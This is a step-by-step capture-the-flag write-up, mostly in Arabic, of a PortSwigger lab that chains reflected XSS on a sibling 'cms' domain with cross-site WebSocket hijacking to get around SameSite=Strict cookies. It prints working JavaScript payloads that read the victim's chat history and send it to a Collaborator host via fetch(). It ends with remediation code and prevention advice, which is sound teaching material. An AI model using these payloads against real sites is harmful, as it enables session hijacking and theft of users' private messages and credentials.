# Lab: SameSite Strict bypass via sibling domain

> **Category:** CSRF / WebSocket  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - SameSite Strict bypass via sibling domain](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة **Cross-Site WebSocket Hijacking (CSWSH)** في خاصية الدردشة المباشرة (live chat). الموقع يستخدم `SameSite=Strict` للكوكي، مما يمنع إرسال الكوكي في أي طلب عبر المواقع. ولكننا سنجد **نطاقاً شقيقاً (sibling domain)** يحتوي على ثغرة XSS تسمح لنا بتنفيذ كود على نطاق يعتبره المتصفح **نفس الموقع (same-site)**، وبالتالي تجاوز حماية SameSite.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تسجيل الدخول وفهم خاصية الدردشة

- سجل الدخول بـ `wiener:peter`
- اذهب إلى **Live chat**
- أرسل بضع رسائل (مثل "hello", "test")
- افتح **DevTools** → تبويب **Network** → ابحث عن اتصال WebSocket (`ws://` أو `wss://`)

### الخطوة 2: فتح WebSocket handshake

افتح WebSocket handshake (طلب GET /chat) في Burp:

```http
GET /chat HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
```

**ملاحظة:** لا يوجد أي توكنات عشوائية في الطلب، مما يجعله عرضة لـ CSWSH.

### الخطوة 3: فهم كيفية عمل WebSocket

عندما تفتح صفحة الدردشة، المتصفح:
1. يرسل `READY` عبر WebSocket
2. الخادم يرد بـ **كل سجل الدردشة** (بما فيها رسائل الآخرين)

### الخطوة 4: اختبار ثغرة CSWSH (بدون تجاوز SameSite)

ننشئ صفحة هجوم تحاول فتح WebSocket:

```html
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

**النتيجة:** WebSocket يفتح، لكنه **لا يحمل كوكي الجلسة** لأن `SameSite=Strict` يمنعه.

### الخطوة 5: البحث عن نطاق شقيق (sibling domain)

في Burp، لاحظ أن بعض الردود تحتوي على:
```
Access-Control-Allow-Origin: https://cms-YOUR-LAB-ID.web-security-academy.net
```

هذا يعني وجود نطاق شقيق:
```
cms-YOUR-LAB-ID.web-security-academy.net
```

**ما هو النطاق الشقيق؟**
- نفس الموقع (same-site) لأن النطاق الرئيسي والثاني يشتركان في نفس **site** (جزء من نفس النطاق)
- المتصفح يعتبر الطلبات بينهما **same-site**، لذلك SameSite=Strict **لا يمنع** الكوكي.

### الخطوة 6: استكشاف النطاق الشقيق

- افتح في المتصفح: `https://cms-YOUR-LAB-ID.web-security-academy.net`
- تجد صفحة تسجيل دخول (login form)

### الخطوة 7: اكتشاف ثغرة XSS في النطاق الشقيق

جرب حقن XSS في معامل `username`:

```
https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=<script>alert(1)</script>&password=anything
```

**النتيجة:** تظهر رسالة `alert(1)` ✅ يوجد Reflected XSS.

### الخطوة 8: اختبار أن الطلب GET يعمل

أرسل طلب POST إلى Repeater، ثم:
- زر الماوس الأيمن → **Change request method** → GET
- الطلب ينجح، والـ XSS لا يزال يعمل ✅

### الخطوة 9: تجهيز payload الـ CSWSH (مشفّر URL)

الكود الأصلي لـ CSWSH:

```javascript
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

**قم بتشفير هذا الكود بالكامل باستخدام URL encoding.**

(يمكنك استخدام أداة مثل Burp Decoder أو أي موقع URL encoder)

### الخطوة 10: إنشاء الهجوم النهائي (XSS في النطاق الشقيق)

نستخدم XSS في النطاق الشقيق لتنفيذ كود الـ CSWSH:

```html
<script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
</script>
```

**مثال (جزء بسيط فقط للتوضيح):**  
يجب أن يكون `YOUR-URL-ENCODED-CSWSH-SCRIPT` هو الكود الكامل المشفر.

### الخطوة 11: رفع الهجوم إلى Exploit Server

- اضغط **Go to exploit server**
- في حقل **Body**، الصق الـ HTML أعلاه
- اضغط **Store**

### الخطوة 12: تجربة الهجوم على نفسك

- اضغط **View exploit**
- انتظر بضع ثوانٍ
- في Burp → **Collaborator** → **Poll now**
- ستجد HTTP interactions تحتوي على **سجل الدردشة الكامل** (بما فيها رسائلك)

### الخطوة 13: التحقق من أن الكوكي أرسل

في Burp → **Proxy > HTTP history**، ابحث عن أحدث طلب `GET /chat`
- تلاحظ وجود كوكي `session` ✅ لأن الطلب جاء من النطاق الشقيق (same-site)

### الخطوة 14: تسليم الهجوم للضحية

- اضغط **Deliver to victim**
- انتظر بضع ثوانٍ
- في Burp → **Collaborator** → **Poll now**

### الخطوة 15: استخراج بيانات الدخول من الدردشة

- افحص الـ HTTP interactions
- ستجد رسائل الدردشة التي تحتوي على **username و password** للضحية (carlos)

مثال:
```
carlos: My password is something like: 3fjsd8f7sdf
```

### الخطوة 16: تسجيل الدخول بحساب الضحية

- استخدم بيانات الدخول التي حصلت عليها
- سجل الدخول بحساب `carlos`
- تم حل المختبر ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هو CSWSH؟** | Cross-Site WebSocket Hijacking - ثغرة تسمح للمهاجم بفتح WebSocket باسم الضحية |
| **ما هو النطاق الشقيق (sibling domain)؟** | نطاق آخر ضمن نفس الـ site (مثل `cms.xxx.com` و `www.xxx.com`) |
| **لماذا تجاوز SameSite=Strict؟** | لأن المتصفح يعتبر النطاق الشقيق جزءاً من نفس الموقع (same-site) |
| **ما دور XSS؟** | نستخدم XSS لتنفيذ كود الـ CSWSH على النطاق الشقيق |
| **لماذا استخدمنا GET في XSS؟** | لأن معامل `username` يعكس في GET أيضاً |

---

## 📊 ملخص آلية التجاوز

| الخطوة | ما يحدث | الكوكي يرسل؟ |
|--------|---------|-------------|
| 1 | الضحية يزور صفحتنا | - |
| 2 | نعيد توجيهه إلى النطاق الشقيق مع XSS | ✅ (same-site) |
| 3 | XSS ينفذ كود WebSocket | ✅ (same-site) |
| 4 | WebSocket يقرأ الدردشة ويرسلها إلى Collaborator | ✅ |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

1. استخدام SameSite=Strict فقط دون حماية إضافية
2. وجود Reflected XSS في نطاق شقيق
3. WebSocket handshake لا يحتوي على CSRF tokens

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// إعدادات الكوكي - SameSite=Strict فقط
res.setHeader('Set-Cookie', `session=${sessionId}; HttpOnly; Secure; SameSite=Strict`);

// نطاق شقيق - وظيفة login بها XSS
export default function loginHandler(req, res) {
  const { username, password } = req.query;
  // خطأ: يعكس username مباشرة بدون تنقية
  res.send(`Invalid username: ${username}`);
}

// WebSocket handshake - بدون CSRF token
export default function wsHandler(req, res) {
  // خطأ: لا يوجد تحقق من هوية الطالب
  upgradeToWebSocket(req, res);
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// إعدادات الكوكي - SameSite=Strict + CSRF Token
res.setHeader('Set-Cookie', `session=${sessionId}; HttpOnly; Secure; SameSite=Strict`);

// نطاق شقيق - إصلاح XSS: تنقية المدخلات
import { escapeHtml } from 'utils';
export default function loginHandler(req, res) {
  const { username, password } = req.query;
  // التصحيح: تنقية المدخلات
  const safeUsername = escapeHtml(username);
  res.send(`Invalid username: ${safeUsername}`);
}

// WebSocket handshake - إضافة CSRF token
export default function wsHandler(req, res) {
  const { sessionId, csrfToken } = req.cookies;
  
  // التحقق من CSRF token
  if (!verifyCsrfToken(sessionId, csrfToken)) {
    return res.status(403).send('Invalid CSRF token');
  }
  
  upgradeToWebSocket(req, res);
}
```

**الخلاصة:** 
1. لا تعتمد على SameSite=Strict فقط
2. أصلح جميع ثغرات XSS في جميع النطاقات
3. استخدم CSRF tokens مع WebSocket handshake

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **إصلاح XSS في جميع النطاقات:** حتى النطاقات الشقيقة.
2. **استخدام CSRF tokens مع WebSocket:** تحقق من توكن في handshake.
3. **استخدام SameSite=Lax أو Strict + CSRF Token معاً.**
4. **عدم الاعتماد على SameSite كحماية وحيدة.**
5. **استخدام Origin header validation:** تأكد أن الطلب يأتي من نطاق موثوق.

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)
- [Cross-Site WebSocket Hijacking (CSWSH)](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)
- [SameSite Cookies Explained](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)
